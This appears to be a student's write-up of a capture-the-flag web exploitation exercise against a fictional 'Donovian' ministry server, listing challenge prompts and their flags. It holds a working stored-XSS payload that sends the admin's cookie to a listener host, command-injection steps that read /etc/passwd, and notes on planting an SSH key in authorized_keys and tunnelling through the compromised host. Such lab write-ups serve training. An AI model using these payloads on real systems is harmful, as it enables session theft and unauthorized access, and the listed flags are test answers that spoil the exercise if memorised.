## Web Exploitation Challanges

```
Donovian Web Exploitation (DWE)
XX OCT 2023
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)

Objective: Maneuver through network, identify and gain access to Minstry of Industry web servers.

Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques limited to cross-site scripting, command injection, file upload, and path transversal. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = W3B3xpl01t5t@rt0F@ct1v1ty

Prior Approvals: Development of SSH access on host: Donovian_MI_websvr. Upon identification of additional Minstry web sites, student is authorized browse to pages to collect intellegence to enable answering CTFd challenges.

Scheme of Maneuver:
>internet_grey_host
-->T1:10.100.28.40

Target Section:

T1
Hostname: Donovian_MI_websvr
IP: 10.100.28.40
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.
```

```
VIP email address
5
Level I Challenge
Through website reconnaissance, what is Romanoff's email address?
http://10.100.28.40/Contract_bids.html
FLAG: N.Romanoff@MI.ru
```

```
Command Injection 1
8
Level III Challenge
Identify the user that the MI website is running as and relevant information about their user environment.
FLAG: Lj2YL0UWW8HcbcYofIfb
```

```

Training Site location
8
Level I Challenge
Training Website

What is the IPv4 address of the Training Site website?


Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
Please send me a corrected cert with the right now.

I took my online training from the following website

10.100.28.55

http://10.100.28.40/uploads/message
```

```
Stored Cross Site Scripting (XSS)
8
Level III Challenge
Intel has found that by policy the Admin must check the Trouble Ticketing system every few minutes. Team lead orders are to "obtain" the Admins cookie.
<script>document.location="http://10.50.43.36:8000/?username="+document.cookie;</script> #javascript to get cookie # from ttl

python3 -m http.server # from op station

```


```
Stored Cross Site Scripting (XSS)
8
Level III Challenge
Intel has found that by policy the Admin must check the Trouble Ticketing system every few minutes. Team lead orders are to "obtain" the Admins cookie.
FLAG: olrq2rp1eRxfA0VlpQeK
```
```
Basic HTTP Understanding
5
Level II Challenge
Training Website

We have an asset that is trying to gain employment into the Ministry, however intelligence does not know the IP address of training web site. Our asset has stated that the training site may only be communicated with from the Ministry web site. We have reason to believe that the MI website might have a message saved inside the web server directory. Once we have located the address analyze that website and determine how to produce a certificate of completion, utilizing the Cyber Training Portal.

The flag will be dumped when successful
FLAG: zEzHfVqaPSSxyvSDl2ZG
```

```
Directory Traversal
5
Level II Challenge
Training Website

Having the ability to now communicate with the training web site, identify any vulnerabilities that could lead to intelligence collection.

Once identified utilize that vulnerability to obtain the flag from where information about user is configured on the system.
FLAG: LRF9M55mqrcxc7eTwLfh
```

```
Reverse shell:
Start with ;whoami See if reverse shell is possible
Might be able to use php to get reverse shell
;cat /etc/passwd To see all usernames, userid, and groupid, and home directory. Find my home directory
;ls –la <home dir>/ See where .ssh folder is, or create .ssh folder
;mkdir <home dir>/.ssh if .ssh isn’t there
Ssh-keygen –t rsa Create key pair on work box (id_rsa is private, id_rsa.pub is public)
;echo <insert key> >> <home dir>/.ssh/authorized_keys Put public key onto box
set up ssh tunnel to new box
make sure to log in as <user>@localhost -p <listener>


ssh student@localhost -p 42301 -L 42302:10.100.28.40:4444
ssh www-data@localhost -p 42302 -D 9050
```
